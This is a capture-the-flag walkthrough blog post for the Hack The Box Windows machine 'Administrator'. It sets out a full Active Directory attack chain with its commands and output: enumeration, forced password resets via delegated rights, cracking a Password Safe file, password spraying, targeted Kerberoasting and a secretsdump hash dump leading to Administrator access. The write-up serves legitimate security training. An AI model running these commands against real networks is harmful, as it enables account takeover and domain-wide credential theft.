---
layout: post
title: Administrator
date: 2025-05-27 10:00:00 +0100
categories: [Walkthroughs]
tags: [htb, windows, active directory, privesc]
---
![alt text](https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png)

[https://app.hackthebox.com/machines/634](https://app.hackthebox.com/machines/634)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Medium        |
| Release Date | 09 Nov 2024        |

# Highlights
Password Spraying, OSINT, Bloodhound, Kerberoasting, Hashcat, Windows Privilege Escalation

---

# Assumed Breach Scenario
This machine simulates an assumed breached scenario, so the creator of the box discloses a username and password ```olivia``` ```ichliebedich```.

This is very common in pentests, a set of credentials would be given to a penetration tester to facilitate the process as the goal is to find vulnerabilities and remediate them before a threat actor can exploit them.

# Open Ports Enumeration
As usual, we start with an nmap scan:

```bash
nmap -T4 -p- -A 10.10.11.42 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 16:09 BST
Nmap scan report for 10.10.11.42
Host is up (0.13s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-27 22:10:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51296/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51301/tcp open  msrpc         Microsoft Windows RPC
51319/tcp open  msrpc         Microsoft Windows RPC
51323/tcp open  msrpc         Microsoft Windows RPC
51355/tcp open  msrpc         Microsoft Windows RPC
63155/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=5/27%OT=21%CT=1%CU=43191%PV=Y%DS=2%DC=T%G=Y%TM=6835D64
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=RD%CI=I%II=I%TS=A)SE
OS:Q(SP=105%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=105%GCD=2%ISR=10E%TI=RD%CI=
OS:I%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=A)SEQ(SP=FF%GCD=
OS:1%ISR=10C%TI=RD%CI=I%TS=A)OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NN
OS:T11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)WIN(W1=FFFF%W2=FFFF%W3=FFF
OS:F%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-27T22:12:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   106.30 ms 10.10.16.1
2   153.86 ms 10.10.11.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.08 seconds
```

Nmap returns the name of the fully qualified domain name ```administrator.htb```, as well as port ```88```for kerberos,```389``` for LDAP and ```636``` for LDAPS, the usual suspects for a domain controller.

What is unsual is port ```21```, ```FTP```(File Transfer Protocol), is not only outdated but insecure. Let's keep this information in our back pocket, might be useful later on.
For now, is important that we add the IP address of the machine and ```administrator.htb``` to our ```/etc/hosts/``` file.

Having a valid user and password allows us to quickly enumerate ```users``` and ```shares``` using ```netexec```
# Users and Shares Enumeration
```bash
netexec smb 10.10.11.42 -u Olivia -p 'ichliebedich' --users                                                      
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-          
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 19      Built-in account for administering the computer/domain
SMB         10.10.11.42     445    DC               Guest                         <never>             19      Built-in account for guest access to the computer/domain
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 19      Key Distribution Center Service Account
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.10.11.42     445    DC               michael                       2025-05-27 19:44:12 0        
SMB         10.10.11.42     445    DC               benjamin                      2025-05-27 19:52:20 4        
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 18       
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 18       
SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR

```
We take notes of all the enumerated users and save them in a ```users.txt``` file

```bash 
netexec smb 10.10.11.42 -u Olivia -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         10.10.11.42     445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share 
```
Nothing stands out from the shares enumeration, our next step is to launch ```Bloodhound``` leveraging our valid credentials.

# Bloodhound
Once generated the json files using ad-bloohound, we upload them to bloodhound for ingesting.
We discover that the user ```olivia``` has ```GenericAll``` permissions over another user, ```Michael```.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Bloodhound%20Olivia-Michael.png?raw=true)
This allows us to make changes to the user ```Michael```, in this case, we change his password and mark him as ```owned``` on Bloodhound.
```bash
net rpc password "michael" 'Password123!' -U "administrator.htb"/"olivia"%"ichliebedich" -S "dc.administrator.htb"
```
Moving to ```Michael```, Bloodhound shows us that he can change the password of the user ```Benjamin``` which is part of a group called ```Share Moderators``` so we change the password of the user called ```Benjamin```, marking him as ```owned``` on Bloodhound.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Bloodhound%20Michael-Benjamin.png?raw=true)
```bash
net rpc password "benjamin" 'Password123!' -U "administrator.htb"/"michael"%'Password123!' -S "dc.administrator.htb"
```
# FTP Access
We know that ```FTP``` is open on port ```21``` and ```Benjamin``` being part of the group ```Share Moderators``` might have access.
Using the command ```ftp benjaming@administrator.htb``` we confirm that ```Benjamin``` has access to ```FTP```, and there is an interesting file ```Backup.psafe3``` so we download it with the command ```mget Backup.psafe3```

```bash
ftp benjamin@administrator.htb     
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||62961|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> 
```
We double check that the file is a psafe3 file with the command ```file Backup.psafe3```. This is an imporant step as it is very common in CTFs to have file extentions renamed, or have file types masked as others to omit information.


```bash
file Backup.psafe3                 
Backup.psafe3: Password Safe V3 database
```
# Password Safe File
After a quick round of ```OSINT``` , we discover that psafe3 files are used by a password manager that is available both for windows and linux, via the official website [https://www.pwsafe.org/](https://www.pwsafe.org/), and both ```john``` and ```hashcat``` can crack the master password for those files.

I have attempted to crack this using ```john``` first on my VM, but after 12 minutes, I had no results so I moved to ```hashcat```.
Using the hashcat docs found [here](https://hashcat.net/wiki/doku.php?id=example_hashes), searching for ```password safe``` the results returned 2 options for the modules:
* 5200	Password Safe v3
* 9000	Password Safe v2

Having checked the file, we know is ```V3```, so we can crack the master password in seconds with the following command:
```bash
hashcat -m 5200 Backup.psafe3  /usr/share/wordlists/rockyou.txt
```
Now we can install ```Password Safe``` from the official website, either on linux or windows, and open the ```Backup.psafe3``` with the cracked password returned by hashcat.
The file contains three entries, ```alexander```, ```emily``` and ```emma```.
We copy all three passwords, and save them in a ```passwords.txt``` file
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Passwordsafe-Users.png?raw=true)

# Password Spraying

Using the ```users.txt``` and ```passwords.txt``` files we have created, we can password spray all users and credentials combinations using the command ```netexec smb administrator.htb -u users.txt -p passwords.txt --continue-on-success```:

```bash
netexec smb administrator.htb -u users.txt -p passwords.txt --continue-on-success

SMB         10.10.11.42     445    DC          
[+] administrator.htb\emily:UXLCI5iETUsIBo***************

```
Out of all the combinations, only one is valid, Emily's password.

# User Flag

Bloodhound confirms that Emily has the ```Remote Management Users``` group, which allows us to access the machine via ```Powershell```, so we use ```Evil-winrm``` to connect and collect the ```user.txt``` flag.
```bash
evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBo***************'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> dir C:\Users\emily\Desktop


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         5/27/2025   3:39 PM             34 user.txt
```
# Further Enumeration using Bloodhound

Bloodhound shows that Emily has ```GenericWrite``` permissions on the user ```Ethan```, suggesting to utilize ```targetkerberoast.py``` to retrieve a crackable hash for this user.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Bloodhound%20Emily-Ethan.png?raw=true)

# Privilege Escalation and Root Flag

Depending on where you are based, this machine might have a different time then your attack machine, because of how kerberos works, this attack might fail.
If you attack fails because on an error mentioning ```time skew too high``` or anything related about ```time```, you can run the following command, more then once if keeps failing.

```bash
sudo ntpdate -u administrator.htb && ./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBo***************'
```
If the attack is successfull, you will receive a hash that starts with ```$krb5tgs$23$``` that can be cracked using the hashcat module ```13100```
```bash
hashcat -m 13100 krbhash.txt /usr/share/wordlists/rockyou.txt
```

Now we have Ethan's password, but he is not a member of the ```Remote Management Users```, so we cannot use ```evil-winrm``` like we did with Emily, but once more, Bloohound comes to the rescue, telling us exactly what we need to do.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Bloodhound%20Ethan-Administrator.png?raw=true)
Using ```secretsdump.py``` against the domain controller, we can dump all the hashes, including the ```Administrator```, using the command ```secretsdump.py``` or ```impacket-secretsdump```, depending on what version of impacket you are using.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/secretsdump.png?raw=true)

Using the ```Administrator``` NT part of the hash, we can authenticate using ```evil-winrm``` and collect the root flag.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/root.png?raw=true)

Enjoy!